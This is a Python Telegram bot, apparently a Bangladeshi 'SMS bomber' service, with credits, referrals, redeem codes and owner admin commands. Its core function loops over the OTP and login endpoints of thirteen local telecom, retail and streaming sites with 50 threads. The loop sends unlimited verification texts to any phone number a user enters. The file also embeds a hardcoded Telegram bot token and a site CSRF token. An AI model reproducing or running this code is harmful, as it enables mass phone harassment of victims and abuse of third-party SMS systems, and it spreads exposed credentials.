import telebot
import requests
import threading
import time
import os
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types
from datetime import datetime

# ==========================================
# 🌐 WEB SERVER
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Advance Bot is Online!"

def run_web_server():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              # Apnar ID boshan
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "@Suptho1_"
CHANNEL_ID = "@SH_tricks"          # Channel username (অবশ্যই @ থাকতে হবে)
DATA_FILE = 'supreme_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (100% Original Style)
# ==========================================

def shopbase_api(target):
    try: requests.post("https://shopbasebd.com/store/registration/sendOTP", data=f"number={target}&_token=ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo", timeout=3)
    except: pass

def apex_api(target):
    try: requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": target}, timeout=3)
    except: pass

def bikroy_api(target):
    try: requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", timeout=3)
    except: pass

def banglalink_api(target):
    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": target}, timeout=3)
    except: pass

def grameenphone_api(target):
    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", data=f"msisdn={target}", timeout=3)
    except: pass

def airtel_api(target):
    try: requests.post("https://www.bd.airtel.com/en", headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"}, data=f'[{"msisdn":"{target}"}]', timeout=3)
    except: pass

def chorki_api(target):
    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def hoichoi_api(target):
    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{target}", "platform": "MOBILE_WEB"}, timeout=3)
    except: pass

def bioscope_api(target):
    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def shikho_api(target):
    try: requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": f"88{target}", "type": "student", "auth_type": "signup", "vendor": "shikho"}, timeout=3)
    except: pass

def bohubrihi_api(target):
    try: requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": target, "intent": "login"}, timeout=3)
    except: pass

def rokomari_api(target):
    try: requests.get(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD", timeout=3)
    except: pass

def ecourier_api(target):
    try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=3)
    except: pass

def attack_executor(target, amount):
    apis = [shopbase_api, apex_api, bikroy_api, banglalink_api, grameenphone_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, shikho_api, bohubrihi_api, rokomari_api, ecourier_api]
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(amount):
            for run_api in apis:
                executor.submit(run_api, target)

# ==========================================
# 🛡️ CHANNEL JOIN CHECK
# ==========================================
def is_joined(user_id):
    if user_id == OWNER_ID: return True
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

# ==========================================
# 🤖 BOT MENU & HANDLERS
# ==========================================

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    args = message.text.split()
    
    # Banned check
    if uid in db.get('banned', []):
        return bot.reply_to(message, "🚫 You are Banned.")

    # Data create and Refer logic
    if uid not in db['users']:
        referrer = args[1] if len(args) > 1 and args[1] in db['users'] else None
        if referrer and referrer != uid:
            db['users'][referrer]['credits'] += 5
            try: bot.send_message(referrer, "🎉 Referral successful! You got 5 credits.")
            except: pass
        db['users'][uid] = {"credits": 5, "total_sent": 0}
        save_data(db)

    # Main Keyboard
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "👤 Profile")
    markup.add("👥 Refer & Earn", "💰 Redeem Credit")
    markup.add("👑 Admin Support")
    bot.send_message(message.chat.id, "🔥 **SUPTHO ADVANCE BOMBER** 🔥", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def menu_handler(message):
    uid = str(message.from_user.id)
    if uid in db.get('banned', []): return

    # Channel Check
    if not is_joined(message.from_user.id):
        btn = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_ID.replace('@','')}"))
        return bot.reply_to(message, "❌ Age channel-e join korun, tarpor bot use korun!", reply_markup=btn)

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 11 digit-er number din:")
        bot.register_next_step_handler(msg, ask_amount)
    
    elif message.text == "👤 Profile":
        u = db['users'].get(uid, {})
        cred = "Unlimited" if int(uid) == OWNER_ID else u.get('credits', 0)
        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💰 Balance: `{cred}`", parse_mode='Markdown')

    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 Invite link:\n`{link}`\n\nPer refer 5 credits paben.")

    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem code din:")
        bot.register_next_step_handler(msg, process_redeem)

    elif message.text == "👑 Admin Support":
        bot.reply_to(message, f"👑 Owner: {OWNER_NAME}\n💬 Support: {OWNER_USERNAME}")

# --- Logic Actions ---
def ask_amount(message):
    target = message.text
    if len(target) != 11: return bot.reply_to(message, "❌ Invalid number!")
    msg = bot.reply_to(message, "🔢 Round amount din (No Limit):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No credits!")
            db['users'][uid]['credits'] -= 1
            save_data(db)
        
        bot.reply_to(message, "🚀 Bombing started!")
        threading.Thread(target=attack_executor, args=(target, amount)).start()
    except: bot.reply_to(message, "❌ Invalid amount!")

def process_redeem(message):
    code, uid = message.text.strip(), str(message.from_user.id)
    if code in db.get('codes', []):
        db['codes'].remove(code)
        db['users'][uid]['credits'] += 10
        save_data(db)
        bot.reply_to(message, "✅ Successful! 10 credits added.")
    else: bot.reply_to(message, "❌ Invalid or used code.")

# ==========================================
# 👑 ADMIN COMMANDS (All Priority)
# ==========================================

@bot.message_handler(commands=['admin', 'stats', 'gencodes', 'broadcast', 'ban', 'unban'])
def handle_admin(message):
    if message.from_user.id != OWNER_ID: return
    cmd = message.text.split()
    
    if cmd[0] == '/admin':
        bot.reply_to(message, "👑 **ADMIN PANEL**\n/stats\n/gencodes <num>\n/broadcast <msg>\n/ban <ID>\n/unban <ID>")
    elif cmd[0] == '/stats':
        bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🔑 Codes: {len(db['codes'])}")
    elif cmd[0] == '/gencodes':
        num = int(cmd[1]) if len(cmd) > 1 else 1
        codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
        db.setdefault('codes', []).extend(codes); save_data(db)
        bot.reply_to(message, f"✅ Codes: `{', '.join(codes)}`")
    elif cmd[0] == '/ban':
        if len(cmd) > 1:
            db.setdefault('banned', []).append(cmd[1])
            save_data(db); bot.reply_to(message, "✅ Banned.")
    elif cmd[0] == '/broadcast':
        msg_text = message.text.replace("/broadcast ", "")
        for u in db['users']:
            try: bot.send_message(u, f"📢 **ADMIN:**\n\n{msg_text}")
            except: pass
        bot.reply_to(message, "✅ Done.")

if __name__ == "__main__":
    keep_alive()
    bot.polling(non_stop=True)
